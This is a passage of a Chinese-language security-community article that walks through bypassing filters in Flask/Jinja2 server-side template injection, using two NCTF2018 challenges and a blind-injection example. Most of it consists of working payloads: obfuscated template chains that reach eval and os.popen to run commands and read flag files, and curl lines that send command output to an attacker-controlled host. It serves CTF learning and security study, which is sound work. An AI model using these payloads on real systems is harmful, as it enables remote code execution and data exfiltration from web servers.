class="o">%</span> <span class="nb">set</span> <span class="n">ini</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ini</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">glo</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">bals</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">itm</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ite</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ms</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pld</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">imp</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">so</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">pon</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">ca</span><span class="o">~</span><span class="n">space</span><span class="o">~</span><span class="n">slas</span><span class="o">~</span><span class="n">flg</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">red</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">right</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">for</span> <span class="n">f</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">ini</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">glo</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">itm</span><span class="p">))()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="n">bul</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="p">(</span><span class="n">v</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">itm</span><span class="p">))()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">ev</span> <span class="o">%</span><span class="p">}{{</span><span class="n">b</span><span class="p">(</span><span class="n">pld</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p><a id="img18" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174703-28f00652-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174703-28f00652-bd3e-1.png"></a></p>
<h2 id="toc-33">过滤了request和class</h2>
<p>这里除了用上面中括号或 <code>|attr()</code> 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。</p>
<p>下面通过NCTF2018的两道flask题目来仔细讲解。</p>
<h3 id="toc-34">[NCTF2018]flask真香</h3>
<p>打开题目一看，是一个炫酷的demo演示，这种demo一般是没有啥东西好挖的。首先F12信息收集，发现Python版本是3.5.2，没有Web静态服务器。</p>
<p><a id="img19" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174704-299b32fc-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174704-299b32fc-bd3e-1.png"></a></p>
<p>随便点开第二个demo发现404了，这里注意到404界面是Flask提供的404界面，按照以往的经验，猜测这里存在SSTI注入。</p>
<p>先尝试简单的payload：</p>
<p><a id="img20" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174705-2a23c158-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174705-2a23c158-bd3e-1.png"></a></p>
<p><a id="img21" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174706-2aa5caa4-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174706-2aa5caa4-bd3e-1.png"></a></p>
<p>从这里可见，毫无疑问的存在SSTI漏洞了。</p>
<p>那么就来康康到底有没有WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：</p>
<div class="highlight"><pre><span></span><span class="n">config</span>
<span class="k">class</span>
<span class="nc">mro</span>
<span class="n">args</span>
<span class="n">request</span>
<span class="nb">open</span>
<span class="nb">eval</span>
<span class="n">builtins</span>
<span class="kn">import</span>
</pre></div>
<p>从这里来看，似乎已经完全无法下手了。因为request和class都被过滤掉了。</p>
<p>卡在这里以后，最好的办法就是去查Flask官方文档了。从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。<strong>由于键是一个字符串，因此可以通过字符串拼接绕过。</strong></p>
<p>python：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]}}</span>
</pre></div>
<p><a id="img22" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174708-2b8b56e6-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174708-2b8b56e6-bd3e-1.png"></a></p>
<p>访问到了类，我们就可以通过 <code>__bases__</code> 来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的<code>object</code>基类了。<strong>（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）</strong></p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]}}</span>
</pre></div>
<p><a id="img23" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174709-2c443062-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174709-2c443062-bd3e-1.png"></a></p>
<p>有了对象基类，我们就可以通过访问 <code>__subclasses__</code> 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现沙箱逃逸了。</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]()}}</span>
</pre></div>
<p><a id="img24" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174712-2e0adcc0-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174712-2e0adcc0-bd3e-1.png"></a></p>
<p>SSTI目的无非就是两个：文件读写、执行命令。因此我们核心应该放在file类和os类。而坑爹的是，Python3几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。</p>
<p>我还是从os库入手，直接搜索“os”，找到了 <code>os._wrap_close</code> 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">312</span><span class="p">]}}</span>
</pre></div>
<p><a id="img25" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174713-2ea589fa-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174713-2ea589fa-bd3e-1.png"></a></p>
<p>我们调用它的 <code>__init__</code> 函数将其实例化，然后用 <code>__globals__</code> 查看其全局变量。</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">312</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">}}</span>
</pre></div>
<p><a id="img26" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174716-305bbc9c-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174716-305bbc9c-bd3e-1.png"></a></p>
<p>眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：</p>
<p><a id="img27" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174717-30f4321a-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174717-30f4321a-bd3e-1.png"></a></p>
<p>由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。</p>
<p>后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">312</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'po'</span><span class="o">+</span><span class="s1">'pen'</span><span class="p">](</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img28" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174718-318fa952-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174718-318fa952-bd3e-1.png"></a></p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">312</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'po'</span><span class="o">+</span><span class="s1">'pen'</span><span class="p">](</span><span class="s1">'cat /Th1s__is_S3cret'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img29" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174719-3222536a-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174719-3222536a-bd3e-1.png"></a></p>
<h3 id="toc-35">[NCTF2018]Flask PLUS</h3>
<p>看到又是Flask，后面又加了PLUS，想必内容肯定没变，应该是过滤内容增加了。</p>
<p>打开题目康康，果然还是demo，随便造一个404，还是那个界面。</p>
<p>直接拿上一道题的payload去找所有的类，果然还是那么多。找到 <code>os._wrap_close</code> 类，打一发上次的payload，结果炸了：</p>
<p><a id="img30" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174719-329c288e-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174719-329c288e-bd3e-1.png"></a></p>
<p>也就是说，这里更新了过滤的内容，需要bypass。</p>
<p>我们来探测了一下，发现这次又加了一些过滤：</p>
<div class="highlight"><pre><span></span><span class="fm">__init__</span>
<span class="nb">file</span>
<span class="vm">__dict__</span>
<span class="n">__builtins__</span>
<span class="nb">__import__</span>
<span class="nb">getattr</span>
<span class="n">os</span>
</pre></div>
<p>完蛋了了，很多方法被过滤了之后，几乎无法访问到我们所需要的方法。</p>
<p>到这里，我们本地机测试一下，看看有哪些方法我们可以用的：</p>
<p><a id="img31" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174721-3387fce6-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174721-3387fce6-bd3e-1.png"></a></p>
<p>这里我们注意到了<code>__enter__</code>方法，查看其内容，发现其竟然有 <code>__globals__</code> 方法可用，也就是说这个<code>__enter__</code>方法与 <code>__init__</code> 方法一模一样。</p>
<p>这里摘抄下一段stack overflow的一段话</p>
<p>这里摘抄下一段stack overflow的一段话</p>
<blockquote><ul>
<li><code>__init__</code> (allocation of the class)</li>
<li><code>__enter__</code> (enter context)</li>
<li><code>__exit__</code> (leaving context)</li>
</ul>
</blockquote>
<p>因此 <code>__enter__</code> 仅仅访问类的内容，但这已经可以达到我们所需要的目的了。</p>
<p>构造payload：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">256</span><span class="p">]</span><span class="o">.</span><span class="fm">__enter__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'po'</span><span class="o">+</span><span class="s1">'pen'</span><span class="p">](</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img32" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174722-3467f47c-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174722-3467f47c-bd3e-1.png"></a></p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">session</span><span class="p">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'__subcla'</span><span class="o">+</span><span class="s1">'sses__'</span><span class="p">]()[</span><span class="mi">256</span><span class="p">]</span><span class="o">.</span><span class="fm">__enter__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'po'</span><span class="o">+</span><span class="s1">'pen'</span><span class="p">](</span><span class="s1">'cat /Th1s_is__F1114g'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img33" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174723-34f973de-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174723-34f973de-bd3e-1.png"></a></p>
<h2 id="toc-36">没有回显的 SSTI</h2>
<p>当目标存在 SSTI 漏洞但是没有payload执行的回显时，我们可以使用 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带出来。</p>
<p>例如下面这道题。进入题目后，会让你输入一个姓名然后将其输出：</p>
<p><a id="img34" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174724-35381530-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174724-35381530-bd3e-1.png"></a></p>
<p>经测试目标存在SSTI漏洞，但是过滤了 <code>{{</code> 和 <code>}}</code>，我们可以使用 <code>{%print(......)%}</code> 的形式来绕过。</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span><span class="k">print</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</pre></div>
<p>但是执行后却没有任何回显了，所以我们还得换一条路子。这里我们使用 <code>{% if ... %}1{% endif %}</code> 配合 <code>os.popen</code> 和 <code>curl</code> 外带数据的方法。</p>
<p>首先在自己vps上面开启监听：</p>
<p><a id="img35" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174724-3575b44e-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174724-3575b44e-bd3e-1.png"></a></p>
<p>然后执行如下payload在根目录里面寻找flag：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="o">.</span><span class="n">linecache</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'curl http://47.xxx.xxx.72:2333 -d `ls /|grep flag`'</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span><span class="mi">1</span><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p>如下图所示，发现flag文件：</p>
<p><a id="img36" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174725-35ba9c3a-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174725-35ba9c3a-bd3e-1.png"></a></p>
<p>执行如下payload读取flag：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="o">.</span><span class="n">linecache</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'curl http://47.xxx.xxx.72:2333 -d `cat /flag_1s_Hera`'</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span><span class="mi">1</span><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p>读取成功：</p>
<p><a id="img37" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174725-36059136-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174725-36059136-bd3e-1.png"></a></p>
<h2 id="toc-37">未完待续……</h2>
<blockquote><p>参考：</p>
<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank">https://evi0s.com/2018/11/26/深入SSTI-从NCTF2018两道Flask看bypass新姿势</a></p>
<p><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#SSTI" target="_blank">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI</a></p>
<p><a href="https://www.gem-love.com/ctf/2598.html" target="_blank">https://www.gem-love.com/ctf/2598.html</a></p>
</blockquote>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="9584">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">11</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="9584">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">2</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/9582" title="记一次艰难的溯源故事（对不起学长）"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>记一次艰难的溯源故事（对不起学长）</a></span>
                        
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/9588" title="520_APK_HOOK"><span class="related-label" style="">下一篇：</span>520_APK_HOOK</a></span>
                        
                    </div>
                </div>
            
        </div>
    </div>
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9584&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9584&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year">
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month">
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
                            <span class="num-box">
                                <span class="badge badge-important">54</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
                            <span class="num-box">
                                <span class="badge badge-important">8</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/15858_1a385b86ba5eb88d54.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
